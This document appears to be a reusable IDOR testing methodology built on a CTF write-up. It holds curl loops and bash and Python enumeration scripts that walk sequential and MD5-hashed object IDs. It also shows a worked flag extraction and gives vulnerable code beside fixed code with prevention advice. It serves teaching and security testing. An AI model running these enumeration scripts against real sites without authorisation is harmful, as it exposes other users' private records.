# IDOR Testing Methodology Template

**Version:** 1.0.0  
**Created:** 2026-06-19  
**Based on:** Corridor CTF IDOR Cheatsheet  
**Purpose:** Reusable methodology for testing Insecure Direct Object Reference vulnerabilities

---

## Overview

IDOR (Insecure Direct Object Reference) occurs when an application uses user-controllable input to access objects directly without proper authorization checks.

**Typical targets:**
- User profiles (by ID)
- Files/documents (by filename or ID)
- API endpoints (by parameter)
- Database records (by sequential ID)

---

## Phase 1: Pattern Recognition (5-15 minutes)

**Objective:** Identify ID scheme and confirm exploitability

### Step 1.1: Locate Object References

Look for URLs, parameters, or endpoints that reference objects:

**Types of object identifiers:**

| Type | Example | Predictability |
|------|---------|--------------------|
| Sequential | `?id=1`, `?id=2`, `?id=3` | Very High |
| MD5 Hash | `?file=c4ca4238a0b923820...` | High (if sequential input) |
| UUID | `?user=550e8400-e29b-41d4-a716-446655440000` | Low |
| Random | `?token=xJ7kL2mP9qR4` | Very Low |
| Timestamp | `?file_id=1624435200` | Medium |

**Example URLs to test:**
```
GET /user/profile?id=123
GET /document/view?doc_id=456
GET /api/files/789
GET /admin/user/101
```

### Step 1.2: Recognize the Pattern

Examine the ID format:

```
Question: What does the ID look like?

Sequential Numbers?
→ Test: 1, 2, 3, 4, ...

MD5/SHA Hash?
→ Analyze: Is it hash(sequential numbers)?
→ Test: Compute hash(1), hash(2), ...

UUID?
→ Less predictable, but still test

Random String?
→ Timing attacks, or brute force if short
```

**Verification Test:**
```bash
# For MD5 hashes:
echo -n "1" | md5sum
# Compare with actual ID in URL

# If they match: It's likely MD5(sequential_numbers)
```

### Step 1.3: Document the Pattern

Create a table:

```
ID Type: [Sequential / MD5 / UUID / Random]
Range Found: 1-13 (or whatever you discover)
Accessible IDs: [List which ones respond with 200]
Protected IDs: [List which ones respond with 403/401]

Example IDs:
- ID 1: HTTP 200 ✓
- ID 2: HTTP 200 ✓
- ...
- ID 13: HTTP 200 ✓
```

---

## Phase 2: Boundary Case Testing (10-20 minutes)

**Objective:** Find unprotected/special cases

### Step 2.1: Test Edge Cases

**Critical cases to test FIRST:**

| Case | Value | Purpose |
|------|-------|---------| 
| Zero | 0 | Boundary condition |
| Negative | -1 | Alternative indexing |
| Very Large | 999999 | Out of range |
| Special Names | "admin" | Text-based ID |
| Null | null or blank | Missing parameter |
| Double | "1.1" | Type confusion |

### Step 2.2: Test Zero-Based vs One-Based Indexing

```bash
# Test ID=0 (most developers forget this)
curl -s http://target.com/user/0

# Compare response size
curl -s http://target.com/user/1 | wc -c
curl -s http://target.com/user/0 | wc -c

# Different size = different content = FOUND!
```

### Step 2.3: Test Negative Numbers

```bash
curl -s http://target.com/user/-1
curl -s http://target.com/user/-2

# Check for error messages that reveal information
```

### Step 2.4: Test Beyond Known Maximum

```bash
# If you find IDs 1-13, test:
curl -s http://target.com/room/14
curl -s http://target.com/room/15
curl -s http://target.com/room/100

# Some apps have hidden IDs beyond documented range
```

---

## Phase 3: Response Analysis (5-10 minutes)

**Objective:** Identify differences indicating accessible data

### Step 3.1: Compare HTTP Status Codes

```bash
# Create a list of status codes
for i in 0 1 2 3 4 5; do
  echo -n "ID $i: "
  curl -s -o /dev/null -w "%{http_code}" http://target.com/user/$i
  echo ""
done

# Output:
# ID 0: 200 ← INTERESTING
# ID 1: 200
# ID 2: 200
# ID 3: 200
# ID 4: 404
```

### Step 3.2: Compare Response Sizes

```bash
# Size is an indicator of different content
for i in 0 1 2 3 4 5; do
  echo -n "ID $i: "
  curl -s http://target.com/room/$i | wc -c
done

# Output:
# ID 0: 797 ← DIFFERENT (likely sensitive)
# ID 1: 632
# ID 2: 632
# ID 3: 632
# ID 4: 632
# ID 5: 632
```

### Step 3.3: Examine Response Content

```bash
# Save responses for comparison
curl -s http://target.com/user/1 > user_1.html
curl -s http://target.com/user/0 > user_0.html

# Compare
diff user_0.html user_1.html

# Or search for sensitive data
grep -i "flag\|password\|secret\|admin" user_0.html
grep -i "flag\|password\|secret\|admin" user_1.html
```

### Step 3.4: Check for Information Disclosure

Look for:
- Flags or keys
- User information
- Admin credentials
- Configuration data
- Internal system info

```bash
# Example: Extract flag from response
curl -s http://target.com/user/0 | grep -o "flag{.*}"
```

---

## Phase 4: Automation (Optional, 10-30 minutes)

**Objective:** Scale testing to larger ID ranges

### Step 4.1: Bash Loop for Simple Enumeration

```bash
#!/bin/bash
# Simple IDOR tester

BASE_URL="http://target.com/user"
RANGE_START=-100
RANGE_END=200

echo "Testing range $RANGE_START to $RANGE_END..."
echo ""

for id in $(seq $RANGE_START $RANGE_END); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/$id")
  SIZE=$(curl -s "$BASE_URL/$id" | wc -c)
  
  if [ "$STATUS" != "404" ]; then
    echo "ID $id: Status=$STATUS Size=$SIZE bytes"
  fi
done
```

### Step 4.2: Python Script for Hash-Based IDOR

```python
#!/usr/bin/env python3
import hashlib
import requests
import sys

def md5_hash(value):
    return hashlib.md5(str(value).encode()).hexdigest()

base_url = sys.argv[1] if len(sys.argv) > 1 else "http://target.com"
start = int(sys.argv[2]) if len(sys.argv) > 2 else 0
end = int(sys.argv[3]) if len(sys.argv) > 3 else 100

print(f"Testing {base_url} for IDs {start} to {end}")
print(f"{'ID':<5} {'Hash':<35} {'Status':<8} {'Size':<10} {'Result'}")
print("-" * 80)

for i in range(start, end + 1):
    hash_value = md5_hash(str(i))
    url = f"{base_url}/{hash_value}"
    
    try:
        response = requests.get(url, timeout=5)
        size = len(response.content)
        status = response.status_code
        
        # Highlight interesting results
        if status == 200:
            result = "✓ ACCESSIBLE"
        elif status == 403:
            result = "FORBIDDEN"
        elif status == 401:
            result = "AUTH REQUIRED"
        else:
            result = ""
        
        if status != 404:
            print(f"{i:<5} {hash_value:<35} {status:<8} {size:<10} {result}")
            
            # Check for sensitive data
            if b"flag" in response.content.lower():
                print(f"       >>> FLAG FOUND <<<")
    except Exception as e:
        print(f"{i:<5} ERROR: {str(e)}")

print("\nDone!")
```

### Step 4.3: Running the Automation

```bash
# Simple bash loop
./idor_test.sh

# Python script with MD5 hashing
python3 idor_test.py http://target.com/room 0 50

# Or with custom range
python3 idor_test.py http://target.com/room -100 200
```

---

## Decision Tree: When to Use Each Approach

```
IDOR Testing Decision Tree

1. Is the ID predictable?
   ├─ YES (sequential, MD5)
   │  └─→ Manual boundary testing first (Phase 2)
   │     └─→ If successful, use automation for scale (Phase 4)
   │
   └─ NO (UUID, random)
      └─→ Consider less likely, but test anyway
         └─→ Use timing attacks or brute force (risky, slow)

2. How many IDs to test?
   ├─ < 50: Manual curl commands
   ├─ 50-1000: Bash loop script
   └─ 1000+: Python script with parallel requests

3. What type of data?
   ├─ Sequential: Direct enumeration (Phase 1-2)
   ├─ Hash-based: Compute hashes, then test (Phase 1-2)
   └─ Token-based: Requires leak or timing analysis (Complex)
```

---

## Real-World Example: Corridor CTF

### Pattern Recognition
```bash
# Observed URLs like:
# http://target.com/c4ca4238a0b923820dcc509a6f75849b
# http://target.com/c81e728d9d4c2f636f067f89cc14862c
# ...

# Recognized: MD5(sequential_numbers)
echo -n "1" | md5sum
# Output: c4ca4238a0b923820dcc509a6f75849b ✓ MATCH!
```

### Boundary Testing
```bash
# Generate and test MD5(0)
hash=$(echo -n "0" | md5sum | cut -d' ' -f1)
curl http://target.com/$hash | wc -c
# Output: 797 bytes (different!)

# Compare with MD5(1)
hash=$(echo -n "1" | md5sum | cut -d' ' -f1)
curl http://target.com/$hash | wc -c
# Output: 632 bytes

# Size difference indicates unprotected content!
```

### Response Analysis
```bash
# Extract the flag
curl http://target.com/cfcd208495d565ef66e7dff9f98764da | grep flag
# Output: flag{2477ef02448ad9156661ac40a6b8862e}
```

### Automation (Extended Testing)
```bash
python3 idor_test.py http://target.com -100 200
# Tests ID -100 to +200 for comprehensive coverage
```

---

## Common Patterns by Technology

### Web Applications

**PHP/Laravel:**
```php
// Vulnerable
$user = User::find($_GET['id']); // No auth check
echo $user->data;

// Fixed
$user = User::find($_GET['id']);
if ($user->owner_id != Auth::user()->id) abort(403);
```

**Node.js/Express:**
```javascript
// Vulnerable
app.get('/api/user/:id', (req, res) => {
  res.json(User.findById(req.params.id));
});

// Fixed
app.get('/api/user/:id', authenticate, (req, res) => {
  const user = User.findById(req.params.id);
  if (user.owner_id !== req.user.id) return res.status(403).send();
  res.json(user);
});
```

**Python/Flask:**
```python
# Vulnerable
@app.route('/profile/<user_id>')
def profile(user_id):
    return jsonify(User.query.get(user_id))

# Fixed
@app.route('/profile/<user_id>')
@login_required
def profile(user_id):
    user = User.query.get(user_id)
    if user.id != current_user.id:
        abort(403)
    return jsonify(user)
```

---

## Testing Checklist

- [ ] Phase 1: Pattern Recognition
  - [ ] Located object references
  - [ ] Identified ID type (sequential/hash/UUID/random)
  - [ ] Verified pattern with test
  - [ ] Documented findings

- [ ] Phase 2: Boundary Testing
  - [ ] Tested ID=0
  - [ ] Tested ID=-1
  - [ ] Tested beyond max known ID
  - [ ] Compared response sizes
  - [ ] Found accessible unprotected resource

- [ ] Phase 3: Response Analysis
  - [ ] Compared HTTP status codes
  - [ ] Compared response sizes
  - [ ] Examined response content
  - [ ] Searched for sensitive data (flags, credentials)

- [ ] Phase 4: Automation (if applicable)
  - [ ] Created testing script
  - [ ] Tested extended ID range
  - [ ] Documented all accessible IDs
  - [ ] Extracted sensitive data

---

## Prevention Strategies (For Developers)

1. **Always implement access control:**
   ```
   Before returning object: Verify user owns it
   ```

2. **Use non-predictable IDs:**
   - UUIDs instead of sequential
   - Random tokens instead of hashes

3. **Implement proper ACLs:**
   - Database table: user_id → object_id mapping
   - Check: Does current_user own this object?

4. **Test boundary cases:**
   - ID=0
   - ID=-1
   - ID=null
   - Empty/missing IDs

---

**Last Updated:** 2026-06-20  
**Status:** Synced to Obsidian from Hermes repo
